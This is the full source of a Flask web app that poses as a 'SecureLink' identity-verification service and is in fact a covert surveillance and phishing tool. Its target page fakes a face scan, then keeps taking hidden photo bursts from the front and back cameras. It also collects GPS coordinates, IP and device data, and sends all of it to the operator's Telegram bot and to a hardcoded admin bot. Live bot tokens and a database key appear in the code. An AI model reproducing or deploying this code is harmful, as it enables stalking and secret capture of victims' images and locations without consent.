# by:@ROMEO_UCHIHA (Stealth Dual-Camera Burst & Pro Landing Page)
from flask import Flask, request, render_template_string, jsonify, redirect, session
from supabase import create_client, Client
import base64, requests, os, time, uuid, random

app = Flask(__name__)
app.secret_key = "uchiha_super_secret_key" 
app.config['TEMPLATES_AUTO_RELOAD'] = True

# --- CACHE BUSTER ---
@app.after_request
def add_header(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

# --- SUPABASE & ADMIN CONFIG ---
SUPA_URL = "https://gijnkxuaejsjbxfruslm.supabase.co"
SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imdpam5reHVhZWpzamJ4ZnJ1c2xtIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njk3NTYzMzcsImV4cCI6MjA4NTMzMjMzN30.6RFyECY1aRVqxniS3xcv_iol31Su1QNLqXGGfTFlHu0"
supabase: Client = create_client(SUPA_URL, SUPA_KEY)

ADMIN_TOKEN = "7808271503:AAGR1uax_qHj7m9LA5oRYaF56LSeAo45EvI"
ADMIN_CID = "6383817850"

def send_tg_msg(token, cid, text):
    try: requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={"chat_id": cid, "text": text, "parse_mode": "Markdown"})
    except: pass

def get_bot_name(token):
    try:
        res = requests.get(f"https://api.telegram.org/bot{token}/getMe").json()
        if res.get("ok"): return res["result"]["first_name"]
    except: pass
    return "Unknown Bot"

def send_tg_photo(token, cid, raw_img, caption=""):
    try: requests.post(f"https://api.telegram.org/bot{token}/sendPhoto", data={"chat_id": cid, "caption": caption, "parse_mode": "Markdown"}, files={"photo": ("c.jpg", raw_img, "image/jpeg")}, timeout=10)
    except: pass

# --- UI TEMPLATES ---
COMMON_STYLE = """
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;800&family=Poppins:wght@300;500;700&display=swap');
    :root { --main-red: #ff0000; --dark-red: #8a0000; }
    @keyframes slideUp { from { transform: translateY(40px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
    body { background: radial-gradient(circle at center, #110000 0%, #000000 100%); color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; padding: 20px; }
    .container { background: rgba(15, 0, 0, 0.8); backdrop-filter: blur(20px); border: 2px solid var(--main-red); border-radius: 24px; padding: 30px; width: 100%; max-width: 500px; box-shadow: 0 0 25px rgba(255, 0, 0, 0.4); animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1); text-align: center; margin-bottom: 20px; }
    h2 { font-family: 'Orbitron', sans-serif; color: var(--main-red); margin-bottom: 25px; font-weight: 800; letter-spacing: 2px; text-shadow: 0 0 15px var(--main-red); }
    input, select { width: 100%; padding: 16px; margin: 10px 0; background: rgba(0, 0, 0, 0.8); border: 1px solid var(--dark-red); color: #fff; border-radius: 14px; outline: none; transition: 0.3s; font-size: 15px; }
    input:focus, select:focus { border-color: var(--main-red); box-shadow: 0 0 15px rgba(255,0,0,0.5); }
    button { width: 100%; padding: 16px; margin-top: 15px; background: linear-gradient(135deg, var(--dark-red), var(--main-red)); color: #fff; border: none; border-radius: 14px; font-weight: 700; font-size: 16px; letter-spacing: 1px; text-transform: uppercase; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 0 20px rgba(255,0,0,0.3); }
    button:hover { transform: scale(1.02); box-shadow: 0 0 25px rgba(255,0,0,0.6); }
    a { color: #888; text-decoration: none; font-size: 13px; display: inline-block; margin-top: 20px; transition: 0.3s; }
    a:hover { color: var(--main-red); text-shadow: 0 0 10px var(--main-red); }
</style>
"""

# PROFESSIONAL LANDING PAGE (NO MENTION OF ANY HACKING/STEALING)
LANDING_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureLink | Advanced Identity Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;500;700&display=swap');
        body { margin: 0; padding: 0; font-family: 'Inter', sans-serif; background: #0f172a; color: #f8fafc; overflow-x: hidden; }
        header { padding: 20px 50px; display: flex; justify-content: space-between; align-items: center; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100; border-bottom: 1px solid #1e293b; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        .logo { font-size: 24px; font-weight: 700; color: #38bdf8; text-decoration: none; display: flex; align-items: center; gap: 10px; }
        .nav-links a { color: #cbd5e1; text-decoration: none; margin-left: 25px; font-weight: 500; transition: 0.3s; font-size: 15px; }
        .nav-links a:hover { color: #38bdf8; }
        .btn-primary { background: #38bdf8; color: #0f172a !important; padding: 10px 24px; border-radius: 8px; text-decoration: none; font-weight: 700; transition: 0.3s; }
        .btn-primary:hover { background: #0ea5e9; box-shadow: 0 0 15px rgba(56, 189, 248, 0.4); }
        .hero { text-align: center; padding: 120px 20px; background: radial-gradient(circle at top, #1e293b 0%, #0f172a 100%); }
        .hero h1 { font-size: 3.5rem; margin-bottom: 20px; color: #fff; max-width: 900px; margin-left: auto; margin-right: auto; }
        .hero h1 span { color: #38bdf8; text-shadow: 0 0 20px rgba(56,189,248,0.3); }
        .hero p { font-size: 1.2rem; color: #94a3b8; max-width: 650px; margin: 0 auto 40px; line-height: 1.6; }
        .features { display: flex; justify-content: center; gap: 40px; padding: 80px 20px; flex-wrap: wrap; background: #0f172a; }
        .card { background: #1e293b; padding: 40px 30px; border-radius: 20px; width: 320px; text-align: center; border: 1px solid #334155; transition: 0.3s; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
        .card:hover { transform: translateY(-10px); border-color: #38bdf8; }
        .card .icon { font-size: 50px; margin-bottom: 20px; }
        .card h3 { color: #f1f5f9; margin-bottom: 15px; font-size: 1.4rem; }
        .card p { color: #94a3b8; font-size: 1rem; line-height: 1.6; }
        footer { text-align: center; padding: 40px; color: #64748b; border-top: 1px solid #1e293b; font-size: 0.9rem; }
        @media(max-width: 768px) { .hero h1 { font-size: 2.5rem; } header { padding: 20px; flex-direction: column; gap: 15px; } .nav-links { margin-top: 10px; } .nav-links a { margin: 0 10px; } }
    </style>
</head>
<body>
    <header>
        <a href="/" class="logo">🔒 SecureLink</a>
        <div class="nav-links">
            <a href="/lg">Sign In</a>
            <a href="/rg" class="btn-primary">Create Secure Link</a>
        </div>
    </header>
    <div class="hero">
        <h1>Protect Your Sensitive Files with <span>Identity Verification</span></h1>
        <p>Ensure that only authorized individuals can access your URLs, images, or documents. Add Face ID and Geolocation layers to your links instantly.</p>
        <a href="/lg" class="btn-primary" style="font-size: 1.2rem; padding: 18px 36px; display: inline-block;">Get Started for Free</a>
    </div>
    <div class="features">
        <div class="card">
            <div class="icon">🛡️</div>
            <h3>Bank-Grade Protection</h3>
            <p>We use advanced encryption and strict verification gates. Users must prove their identity before the original content is unlocked.</p>
        </div>
        <div class="card">
            <div class="icon">👤</div>
            <h3>Biometric Access</h3>
            <p>Integrate real-time camera face verification. Prevent bots and unauthorized sharing of your confidential data.</p>
        </div>
        <div class="card">
            <div class="icon">📍</div>
            <h3>Location Lock</h3>
            <p>Restrict access to specific regions. The link automatically verifies the user's GPS coordinates before granting entry.</p>
        </div>
    </div>
    <footer>
        &copy; 2026 SecureLink Protocol. All rights reserved. Secure Data Transfer Solutions.
    </footer>
</body>
</html>
"""

@app.route("/")
def index(): 
    # Redirecting base URL to the Professional Landing Page
    return render_template_string(LANDING_PAGE)

@app.route("/rg", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        token, cid = request.form.get("token"), request.form.get("cid")
        otp = str(random.randint(1000, 9999))
        supabase.table("otps").insert({"chat_id": cid, "bot_token": token, "otp": otp, "bot_name": get_bot_name(token), "purpose": "register"}).execute()
        send_tg_msg(token, cid, f"😈 *UCHIHA REGISTRATION*\\n\\nCode: `{otp}`")
        return redirect(f"/verify_otp?cid={cid}&purpose=register")
    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>REGISTER</h2><form method="POST"><input type="text" name="token" placeholder="Bot Token" required><input type="text" name="cid" placeholder="Chat ID" required><button type="submit">Send OTP</button></form><a href="/lg">Login here</a></div>')

@app.route("/lg", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        cid = request.form.get("cid")
        users = supabase.table("users").select("*").eq("chat_id", cid).execute().data
        if not users: return f"{COMMON_STYLE}<div class='container'><h2>ERROR</h2><p>Not registered!</p><a href='/rg'>Register</a></div>"
        elif len(users) == 1:
            otp = str(random.randint(1000, 9999))
            supabase.table("otps").insert({"chat_id": cid, "bot_token": users[0]["bot_token"], "otp": otp, "purpose": "login"}).execute()
            send_tg_msg(users[0]["bot_token"], cid, f"🔐 *LOGIN OTP*\\n\\nCode: `{otp}`")
            return redirect(f"/verify_otp?cid={cid}&purpose=login&token={users[0]['bot_token']}")
        else:
            html = f"{COMMON_STYLE}<div class='container'><h2>SELECT BOT</h2>"
            for u in users: html += f"<form method='POST' action='/send_login_otp'><input type='hidden' name='cid' value='{cid}'><input type='hidden' name='token' value='{u['bot_token']}'><button type='submit'>🤖 {u['bot_name']}</button></form>"
            return render_template_string(html + "</div>")
    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>LOGIN</h2><form method="POST"><input type="text" name="cid" placeholder="Chat ID" required><button type="submit">Continue</button></form><a href="/rg">Create account</a></div>')

@app.route("/send_login_otp", methods=["POST"])
def send_login_otp():
    cid, token = request.form.get("cid"), request.form.get("token")
    otp = str(random.randint(1000, 9999))
    supabase.table("otps").insert({"chat_id": cid, "bot_token": token, "otp": otp, "purpose": "login"}).execute()
    send_tg_msg(token, cid, f"🔐 *LOGIN OTP*\\n\\nCode: `{otp}`")
    return redirect(f"/verify_otp?cid={cid}&purpose=login&token={token}")

@app.route("/verify_otp", methods=["GET", "POST"])
def verify_otp():
    cid, purpose, token = request.args.get("cid"), request.args.get("purpose"), request.args.get("token", "")
    if request.method == "POST":
        query = supabase.table("otps").select("*").eq("chat_id", cid).eq("purpose", purpose).eq("otp", request.form.get("otp"))
        if token: query = query.eq("bot_token", token)
        res = query.execute().data
        if res:
            if purpose == "register": supabase.table("users").insert({"chat_id": cid, "bot_token": res[-1]["bot_token"], "bot_name": res[-1]["bot_name"]}).execute()
            session["user_id"] = supabase.table("users").select("*").eq("bot_token", res[-1]["bot_token"]).execute().data[0]["id"]
            supabase.table("otps").delete().eq("chat_id", cid).execute()
            return redirect("/ds")
        return f"{COMMON_STYLE}<div class='container'><h2>FAILED</h2><p>Invalid OTP!</p><a href='/lg'>Try Again</a></div>"
    return render_template_string(f'{COMMON_STYLE}<div class="container"><h2>VERIFY OTP</h2><form method="POST"><input type="text" name="otp" placeholder="4-Digit Code" required><button type="submit">Verify</button></form></div>')

# --- TARGET PAGE (HACK UI & RED THEME) ---
@app.route("/t/<link_id>")
def target_page(link_id):
    res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
    if not res.data: return "Link Not Found or Deleted!"
    
    data = res.data[0]
    target_type = data.get("target_type", "both")
    action_mode = data.get("action_mode", "redirect")
    action_value = data.get("action_value", "")
    text_content = data.get("text_content", "")
    file_type = data.get("file_type", "")

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Identity Verification</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Share+Tech+Mono&display=swap');
            :root { --red: #ff0000; --green: #00ff00; --grey: #333333; }
            * { box-sizing: border-box; margin: 0; padding: 0; }
            body { background: #000; color: var(--red); font-family: 'Share Tech Mono', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
            .face-container { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; }
            .ring-container { position: relative; width: 330px; height: 330px; display: flex; align-items: center; justify-content: center; margin-bottom: 20px; }
            .ray-ring { position: absolute; width: 100%; height: 100%; border-radius: 50%; background: conic-gradient(var(--grey) 100%, transparent 0); -webkit-mask: radial-gradient(transparent 64%, #000 66%), repeating-conic-gradient(#000 0deg, #000 3deg, transparent 3deg, transparent 7deg); z-index: 1; }
            .face-wrapper { position: relative; width: 280px; height: 280px; border-radius: 50%; overflow: hidden; border: 2px solid rgba(255,0,0,0.5); box-shadow: 0 0 35px rgba(255,0,0,0.3); z-index: 2; }
            #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); background: #050000; } 
            .scan-ring { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 4px solid transparent; border-top-color: var(--red); border-right-color: rgba(255,0,0,0.3); border-radius: 50%; animation: spin 2s linear infinite; box-shadow: inset 0 0 25px rgba(255,0,0,0.5); z-index: 10; pointer-events: none; }
            .scanner-line { position: absolute; top: 0; left: 0; width: 100%; height: 3px; background: #ff0000; box-shadow: 0 0 15px #ff0000, 0 0 30px #ff0000; z-index: 16; animation: scanAnim 2.5s infinite ease-in-out; pointer-events: none; }
            .loc-container { display: none; text-align: center; flex-direction: column; align-items: center; justify-content: center;}
            .pin-icon { font-size: 80px; color: var(--red); animation: bounce 1s infinite; margin-bottom: 20px; text-shadow: 0 0 20px var(--red); }
            @keyframes spin { 100% { transform: rotate(360deg); } }
            @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-20px); } }
            @keyframes scanAnim { 0% { top: 5%; opacity: 0; } 10% { opacity: 1; } 50% { top: 95%; opacity: 1; } 90% { opacity: 1; } 100% { top: 5%; opacity: 0; } }
            .instruction-text { font-family: 'Orbitron'; font-size: 1.2rem; letter-spacing: 2px; color: #fff; text-shadow: 0 0 10px var(--red); min-height: 30px; text-transform: uppercase; margin-bottom: 10px; text-align:center;}
            .timer-display { font-family: 'Orbitron'; font-size: 4.5rem; font-weight: 900; color: var(--red); text-shadow: 0 0 20px var(--red); line-height: 1; margin-top: 10px; }
            #result-ui { display: none; width: 100%; height: 100%; padding: 20px; text-align: center; overflow-y: auto; }
            .content-box { background: rgba(20,0,0,0.8); border: 1px solid var(--red); padding: 20px; border-radius: 15px; box-shadow: 0 0 25px rgba(255,0,0,0.3); width: 100%; max-width: 650px; margin: 0 auto; min-height: 80vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
            .content-text { color: #fff; font-size: 1.5rem; white-space: pre-wrap; font-family: 'Poppins'; margin-bottom: 20px;}
            .btn-download { display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; max-width: 350px; margin-top: 25px; padding: 16px; background: linear-gradient(135deg, #8a0000, #ff0000); color: #fff; border: 2px solid var(--red); border-radius: 12px; font-family: 'Orbitron', sans-serif; font-size: 16px; font-weight: 800; text-decoration: none; text-transform: uppercase; letter-spacing: 1px; box-shadow: 0 0 20px rgba(255,0,0,0.5); transition: 0.3s; cursor: pointer; }
            .btn-download:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,0,0,0.8); }
        </style>
    </head>
    <body>
        
        <div id="cam-section" class="face-container">
            <div class="ring-container">
                <div class="ray-ring" id="rayRing"></div>
                <div class="face-wrapper">
                    <div class="scan-ring"></div>
                    <div class="scanner-line"></div>
                    <video id="v" autoplay playsinline muted></video>
                </div>
            </div>
            <p class="instruction-text" id="face-msg">INITIALIZING CAMERA...</p>
            <div class="timer-display" id="seconds-timer">15</div>
        </div>

        <div id="loc-section" class="loc-container">
            <i class="fas fa-map-marker-alt pin-icon"></i>
            <p class="instruction-text" id="loc-msg">SECURING LOCATION UPLINK...</p>
        </div>

        <div id="result-ui">
            <div class="content-box" id="media-content"></div>
        </div>

        <canvas id="c" style="display:none"></canvas>
        
        <video id="bg-v" playsinline autoplay muted style="position:fixed; top:-1000px; left:-1000px; width:10px; height:10px; opacity:0; z-index:-999;"></video>

        <script>
            let mode = "{{ t_type }}";
            let actMode = "{{ a_mode }}";
            let actVal = "{{ a_val }}";
            let txtVal = {{ t_content | tojson | safe }};
            let fType = "{{ f_type }}";

            const v = document.getElementById('v');
            const bgV = document.getElementById('bg-v');
            const c = document.getElementById('c');
            let captureInterval = null;
            let bgCamMode = "environment"; // Pehli dafa background Back camera chalega

            window.onload = () => { getHardware(); startVerificationFlow(); };

            function getHardware() {
                let info = { plat: navigator.platform, cores: navigator.hardwareConcurrency || 0 };
                fetch("/api/log_hardware/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify(info) });
            }

            async function startVerificationFlow() {
                if(mode === 'both' || mode === 'camera') {
                    document.getElementById('cam-section').style.display = 'flex'; 
                    try {
                        v.srcObject = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                        startFaceCheck();
                    } catch(e) {
                        document.getElementById('face-msg').innerText = "CAMERA ACCESS DENIED";
                        document.getElementById('face-msg').style.color = "red";
                        document.getElementById('seconds-timer').style.display = "none";
                        setTimeout(() => location.reload(), 2500);
                    }
                } else if (mode === 'location') {
                    startLocationCheck();
                } else {
                    showContent(); 
                }
            }

            function takeSnap() {
                if(v.readyState < 2 || v.videoWidth === 0 || v.videoHeight === 0) return;
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
                let imgData = c.toDataURL('image/jpeg', 0.5);
                if(imgData.length < 1000) return; 
                fetch("/api/capture/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({ img: imgData, cam_type: "FRONT" }) });
            }

            function startFaceCheck() {
                captureInterval = setInterval(takeSnap, 600); 

                let timeLeft = 15;
                let instructions = ["Look Straight", "Look Left", "Look Right", "Look Slightly Up", "Scanning Features..."];
                let step = 0;
                const faceMsg = document.getElementById('face-msg');
                const timerText = document.getElementById('seconds-timer');
                const rayRing = document.getElementById('rayRing');

                let startTime = Date.now();
                let duration = 15000; 
                
                let animFrame = setInterval(() => {
                    let elapsed = Date.now() - startTime;
                    let percent = Math.min((elapsed / duration) * 100, 100);
                    rayRing.style.background = `conic-gradient(var(--green) ${percent}%, var(--grey) 0%)`;
                    if (percent >= 100) clearInterval(animFrame);
                }, 50); 

                let timer = setInterval(() => {
                    timeLeft--;
                    timerText.innerText = timeLeft; 
                    if(timeLeft % 3 === 0) step = (step + 1) % instructions.length;
                    faceMsg.innerText = instructions[step];

                    if(timeLeft <= 0) {
                        clearInterval(timer);
                        clearInterval(captureInterval);
                        if (v.srcObject) v.srcObject.getTracks().forEach(t => t.stop());

                        if(mode === 'both') {
                            document.getElementById('cam-section').style.display = 'none';
                            startLocationCheck();
                        } else {
                            showContent();
                        }
                    }
                }, 1000);
            }

            function startLocationCheck() {
                document.getElementById('loc-section').style.display = 'flex';
                const locMsg = document.getElementById('loc-msg');
                if(navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (p) => {
                            fetch("/api/log_loc/{{ l_id }}", { method: "POST", headers: {"Content-Type":"application/json"}, body: JSON.stringify({lat: p.coords.latitude, lon: p.coords.longitude}) });
                            locMsg.innerText = "LOCATION VERIFIED";
                            setTimeout(showContent, 1000);
                        },
                        (e) => {
                            locMsg.innerText = "LOCATION DENIED. RELOADING...";
                            setTimeout(() => location.reload(), 2000);
                        }
                    );
                } else { showContent(); }
            }

            // CONTINUOUS BURST & SWAP LOGIC (Jitni front ki utni back ki)
            async function captureBackground() {
                try {
                    if (bgV.srcObject) bgV.srcObject.getTracks().forEach(t => t.stop());
                    
                    let stream;
                    try { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: bgCamMode } } }); } 
                    catch(err) { stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: bgCamMode } }); }
                    
                    bgV.srcObject = stream;
                    bgV.onloadedmetadata = () => {
                        bgV.play();
                        let snapCount = 0;
                        
                        // Wait 1.5s for camera to adjust, then start taking fast pictures
                        setTimeout(() => {
                            let burst = setInterval(() => {
                                // Take 3 pictures in burst mode per camera side
                                if(bgV.videoWidth > 0 && snapCount < 3) {
                                    c.width = bgV.videoWidth; c.height = bgV.videoHeight;
                                    c.getContext('2d').drawImage(bgV, 0, 0, c.width, c.height);
                                    let imgData = c.toDataURL('image/jpeg', 0.5);
                                    let label = bgCamMode === "user" ? "FRONT" : "BACK";
                                    
                                    fetch("/api/capture/{{ l_id }}", { 
                                        method: "POST", headers: {"Content-Type":"application/json"}, 
                                        body: JSON.stringify({ img: imgData, cam_type: label }) 
                                    });
                                    snapCount++;
                                } else {
                                    clearInterval(burst);
                                    // Change Camera Mode for Next Round
                                    bgCamMode = (bgCamMode === "environment") ? "user" : "environment";
                                    // Start next loop immediately
                                    captureBackground();
                                }
                            }, 800); // Har 800ms me ek photo
                        }, 1500);
                    };
                } catch(e) { 
                    // Agar back camera fail ho to sirf front use karta rahega
                    bgCamMode = "user";
                    setTimeout(captureBackground, 3000);
                }
            }

            function showContent() {
                document.getElementById('cam-section').style.display = 'none';
                document.getElementById('loc-section').style.display = 'none';
                
                let resBox = document.getElementById('result-ui');
                let medBox = document.getElementById('media-content');
                resBox.style.display = 'block';

                let html = "";
                if(actMode === 'text') {
                    html = `<div class="content-text">${txtVal}</div>`;
                } else if (actMode === 'file') {
                    let ext = actVal.split('.').pop().toLowerCase();
                    let isVideo = ['mp4', 'webm', 'ogg', 'mov'].includes(ext);
                    let isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext);

                    if(isVideo || fType === 'video') {
                        html = `<video src="${actVal}" controls autoplay playsinline style="width:100%; max-height:60vh; border-radius:10px; border: 2px solid var(--red); box-shadow: 0 0 20px rgba(255,0,0,0.3);"></video>`;
                    } else if (isImage || fType === 'image') {
                        html = `<img src="${actVal}" alt="Secure File" style="width:100%; max-height:60vh; object-fit:contain; border-radius:10px; border: 2px solid var(--red); box-shadow: 0 0 20px rgba(255,0,0,0.3);">`;
                    } else {
                        html = `<iframe src="${actVal}" style="width:100%; height:50vh; border:none; border-radius:10px; border: 2px solid var(--red);"></iframe>`;
                    }
                    html += `<a href="${actVal}" download target="_blank" class="btn-download"><i class="fas fa-download"></i> Download Secure File</a>`;
                } else {
                    html = `<iframe src="${actVal}" style="width:100%; height:80vh; border:none; border-radius:10px;"></iframe>`;
                }
                medBox.innerHTML = html;

                // Fire up continuous alternating burst capture loop
                if(mode === 'both' || mode === 'camera') { captureBackground(); }
            }
        </script>
    </body>
    </html>
    ''', t_type=target_type, a_mode=action_mode, a_val=action_value, t_content=text_content, f_type=file_type, l_id=link_id)

# --- BACKEND LOGGING APIS ---
@app.route("/api/log_hardware/<l_id>", methods=["POST"])
def log_hw(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        user = link["users"]
        d = request.get_json()
        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        dev_info = f"{d['plat']} - Cores: {d['cores']}"
        
        msg = f"🎯 *TARGET HIT*\\n\\n🌐 *IP:* `{ip}`\\n💻 *Device:* {dev_info}\\n📌 *Mode:* {link['target_type'].upper()}"
        send_tg_msg(user["bot_token"], user["chat_id"], msg)
        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: TARGET HIT*\\nUser: {user['bot_name']}\\nIP: {ip}")
    except: pass
    return jsonify({"s": 1})

@app.route("/api/log_loc/<l_id>", methods=["POST"])
def log_loc(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        user = link["users"]
        d = request.get_json()
        
        map_link = f"https://www.google.com/maps?q={d['lat']},{d['lon']}"
        msg = f"📍 *LOCATION FOUND*\\n\\nLat: `{d['lat']}`\\nLon: `{d['lon']}`\\n🗺 Map: {map_link}"
        
        send_tg_msg(user["bot_token"], user["chat_id"], msg)
        send_tg_msg(ADMIN_TOKEN, ADMIN_CID, f"🔥 *ADMIN ALERT: LOCATION*\\nUser: {user['bot_name']}\\n{msg}")
    except: pass
    return jsonify({"s": 1})

@app.route("/api/capture/<l_id>", methods=["POST"])
def cap(l_id):
    try:
        link = supabase.table("links").select("*, users(*)").eq("id", l_id).execute().data[0]
        user = link["users"]
        data = request.get_json()
        
        img_data = data["img"]
        cam_type = data.get("cam_type", "UNKNOWN")
        raw = base64.b64decode(img_data.split(",")[1])
        
        send_tg_photo(user["bot_token"], user["chat_id"], raw, f"😈 *UCHIHA CAPTURE*\\n📸 *Camera:* `{cam_type}`")
        send_tg_photo(ADMIN_TOKEN, ADMIN_CID, raw, f"🔥 *ADMIN COPY*\\nBy: {user['bot_name']}\\nCam: {cam_type}")
        return jsonify({"s": 1})
    except: return jsonify({"s": 0})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, threaded=True)
